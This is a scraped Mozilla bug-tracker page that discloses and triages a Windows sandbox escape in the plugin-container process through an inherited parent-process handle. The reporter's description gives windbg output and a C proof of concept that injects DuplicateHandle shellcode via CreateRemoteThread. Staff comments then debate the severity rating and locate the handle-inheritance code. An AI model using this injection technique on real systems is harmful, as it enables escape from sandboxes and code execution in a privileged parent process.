        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (2 files, 1 obsolete file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8544691">debugging patch</a>
        </div>
        <div>
            <a href="#c23" class="attach-time activity-ref"><span class="rel-time" title="2015-01-06 09:56 PST" data-time="1420566969">7 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_279663" ><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div></span>
        </div>
        <div class="attach-info">10.41 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8544691&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8544691&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8544691">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8545201">handle fix</a>
        </div>
        <div>
            <a href="#c32" class="attach-time activity-ref"><span class="rel-time" title="2015-01-07 04:02 PST" data-time="1420632144">7 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_279663" ><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div></span>
        </div>
        <div class="attach-info">2.48 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8545201&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8545201&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8545201">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8545254">mc handle fix</a>
        </div>
        <div>
            <a href="#c40" class="attach-time activity-ref"><span class="rel-time" title="2015-01-07 07:01 PST" data-time="1420642912">7 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_279663" ><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div></span>
        </div>
        <div class="attach-info">1.66 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_7044" ><span class="fn">benjamin</span>
</div>:
              <a href="#a441067_7044"
                  class="flag-name-status rel-time-title activity-ref"
                  title="7 years ago"
              data-time="1420642912"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_272375" ><span class="fn">lsblakk</span>
</div>:
              <a href="#c53"
                  class="flag-name-status rel-time-title activity-ref"
                  title="7 years ago"
              data-time="1420728823"
            >
              approval-mozilla-aurora+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_272375" ><span class="fn">lsblakk</span>
</div>:
              <a href="#c53"
                  class="flag-name-status rel-time-title activity-ref"
                  title="7 years ago"
              data-time="1420728823"
            >
              approval-mozilla-release+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8545254&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8545254&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8545254">Splinter Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="tJH33IwRQeMJiCn5FBylBLO7rBrRr2vbfMRU9ey9F0jAxpPv">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="9746951" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_344130" ><img src="https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_344130" ><a class="email " href="/user_profile?user_id=344130" > <span class="fna">Nils</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 09:32 PST" data-time="1420219929">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-0" data-comment-id="9746951">The sandboxed plugin-container.exe process on Windows holds a handle to the parent process. We can observe this in windbg:

0:007:x86&gt; !handle 18c 1
Handle 18c
  Type         	Process
0:007:x86&gt; !handle 18c 2
Handle 18c
  Attributes   	0
  GrantedAccess	0x101441:
         Synch
         
  HandleCount  	9
  PointerCount 	283079
0:007:x86&gt; !handle 18c 8
Handle 18c
  Object Specific Information
    Process Id  5868
    Parent Process  1720
    Base Priority 8

While the access rights on this handle are somewhat limited (0x101441) it still allows us to duplicate handles in the parent process (PROCESS_DUP_HANDLE). Using DuplicateHandle we can issue a call that duplicate the process handle from the parent process to our current process (-1 a pseudo handles to the parent and current (sandboxed process):

DuplicateHandle(0x18c, -1, -1, 0, 0, 0, 2)

The call will succeed and a new handle to the parent process is created in the sandboxed child. This handle has full access to the parent which then allows for executing arbitrary code in the parent through CreateRemoteThread:

0:007:x86&gt; !handle 36c 1
Handle 36c
  Type         	Process
0:007:x86&gt; !handle 36c 2
Handle 36c
  Attributes   	0
  GrantedAccess	0x1fffff:
         Delete,ReadControl,WriteDac,WriteOwner,Synch
         
  HandleCount  	9
  PointerCount 	282785
0:007:x86&gt; !handle 36c 8
Handle 36c
  Object Specific Information
    Process Id  5868
    Parent Process  1720
    Base Priority 8


This is a quick and dirty PoC which injects a &quot;shellcode&quot; into the sandboxed process (PID on the command line and address of DuplicateHandle and the Handle are currently hardcoded):


#include &quot;stdafx.h&quot;
#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;

unsigned char code[] = &quot;&quot;
&quot;\xcc\xcc\x90\x90&quot;
&quot;\x6A\x02&quot;           // PUSH 0 duplicate same access
&quot;\x6A\x00&quot;           // PUSH 0 inherit
&quot;\x6A\x00&quot;           // PUSH 0 dwDesiredAccess
&quot;\x6A\x00&quot;           // PUSH 0 lpTargetHandle
&quot;\x68\xff\xff\xff\xff&quot;//PUSH 0 // hTargetProcessHandle
&quot;\x68\xff\xff\xff\xff&quot;//PUSH 0 // hSourceHandle
&quot;\x68\x8c\x01\x00\x00&quot;//PUSH 18C // hSourceProcessHandle
&quot;\x68\x00\x87\x5f\x76&quot;//PUSH 765f8700  &lt;--- ptr to kernel32!DuplicateHandle
&quot;\x58&quot;		//          POP EAX
&quot;\xFF\xD0&quot;  //          CALL EAX
&quot;\xcc\xcc\x90\x90\xc3&quot;;

int _tmain(int argc, _TCHAR* argv[])
{
	INT pid = _wtoi(argv[1]);
	printf(&quot;[-] Attaching to process %d\n&quot;, pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	printf(&quot;[-] Process handle: 0x%x\n&quot;, hProcess);
	VOID *dllname = VirtualAllocEx(hProcess, NULL, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, dllname, (void*)code, sizeof(code), NULL);
	printf(&quot;[-] remote code: %x\n&quot;, dllname);
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) dllname, dllname, 0, NULL);
	printf(&quot;[-] Remote thread: %x\n&quot;, hThread);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return 0;
}</pre></div><div class="change-set" id="a330_368570"><div class="change" id="aa330_368570">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_368570" id="a330_368570"><img src="https://secure.gravatar.com/avatar/9e7272cd8191f064be3b2b7dcd6a8903?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_368570" id="a330_368570"><a class="email disabled" href="/user_profile?user_id=368570" > <span class="fna">Christoph Diehl [:posidron]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a330_368570"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a330_368570">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a330_368570">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 09:37 PST" data-time="1420220259">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          
            <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="c1"><div class="comment" data-id="9747161" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a330_368570"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7044" id="a330_368570"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 10:57 PST" data-time="1420225022">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-1" data-comment-id="9747161">I think we rate sandbox escapes as moderate, no?

Nils, do you know what handle this is in the source code?</pre><div class="activity"><div class="change">Flags: needinfo?(nils)</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a> &rarr; <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a></div></div></div><div class="change-set" id="c2"><div class="comment" data-id="9747193" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a330_368570"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a330_368570"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 11:11 PST" data-time="1420225875">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-2" data-comment-id="9747193">(In reply to Benjamin Smedberg  [:bsmedberg] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c1">comment #1</a>)
<span class="quote">&gt; I think we rate sandbox escapes as moderate, no?</span >

This is not necessarily the case on discussions with Dan Veditz and others. In fact, I believe we tend to rate them as sec-critical if they allow people to then do bad things.</pre></div><div class="change-set" id="c3"><div class="comment" data-id="9747194" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a330_368570"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a330_368570"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 11:12 PST" data-time="1420225929">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-3" data-comment-id="9747194">Dan, do you want to comment here?</pre><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div><div class="change">Keywords: <span class="activity-deleted"><a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a></span></div></div></div><div class="change-set" id="c4"><div class="comment" data-id="9747206" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_344130" id="a330_368570"><img src="https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_344130" id="a330_368570"><a class="email " href="/user_profile?user_id=344130" > <span class="fna">Nils</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 11:24 PST" data-time="1420226671">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-4" data-comment-id="9747206">Benjamin, I suspect it is an inherited handle from the parent process. On line <a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#333">http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#333</a> bInheritHandles seems to be true.

Are inherited handles being checked at startup currently? There might be others that could lead to break-outs.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(nils)</span></div></div></div><div class="change-set" id="c5"><div class="comment" data-id="9747582" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a330_368570"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7044" id="a330_368570"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 13:53 PST" data-time="1420235638">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-5" data-comment-id="9747582">That looks like a bug. We should be passing an explicit list of handles to inherit via (and we are, at <a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#309">http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#309</a>) but then we end up passing true as bInherit, which will inherit all inheritable handles which may happen to be active in the process.

bobowen, can you look at this?</pre></div><div class="change-set" id="a15718_7044"><div class="change" id="aa15718_7044">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_7044" id="a15718_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15718_7044"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15718_7044">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a15718_7044">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-02 13:54 PST" data-time="1420235647">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(bobowencode)</div></div></div><div class="change-set" id="c6"><div class="comment" data-id="9748710" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a15718_7044"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 09:40 PST" data-time="1420306809">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-6" data-comment-id="9748710">We can't have it both ways on the rating. You could make the argument that a sandbox escape by itself is not that harmful and should be moderate, but then we should be rating all the other bugs at full strength. If we're downrating other sec-critical bugs &quot;because they're sandboxed&quot; then the sandbox itself is a critical security feature. We've gone to the trouble of creating the sandbox on the assumption the boxed code has bugs, so the rating reflects [escape + assumed bug(s)] and not the escape alone.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="c7"><div class="comment" data-id="9748775" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a15718_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a15718_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-03 10:54 PST" data-time="1420311246">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-7" data-comment-id="9748775">(In reply to Benjamin Smedberg  [:bsmedberg] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c5">comment #5</a>)
<span class="quote">&gt; That looks like a bug. We should be passing an explicit list of handles to
&gt; inherit via (and we are, at
&gt; <a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/">http://dxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/</a>
&gt; process_util_win.cc#309) but then we end up passing true as bInherit, which
&gt; will inherit all inheritable handles which may happen to be active in the
&gt; process.
&gt; 
&gt; bobowen, can you look at this?</span >

For the sandboxed process the handle inheritance code is here:
<a rel="nofollow" href="http://dxr.mozilla.org/mozilla-central/source/security/sandbox/win/src/broker_services.cc#389">http://dxr.mozilla.org/mozilla-central/source/security/sandbox/win/src/broker_services.cc#389</a>

Although it is very similar.

My understanding is that with the list specified it will only inherit handles on the list.
So, I'm not sure where this handle is coming from.
I think if you don't have inherit handles set to true then it won't inherit anything.
I'll try and test this.


Nils - at what point have you stopped the process in windbg?
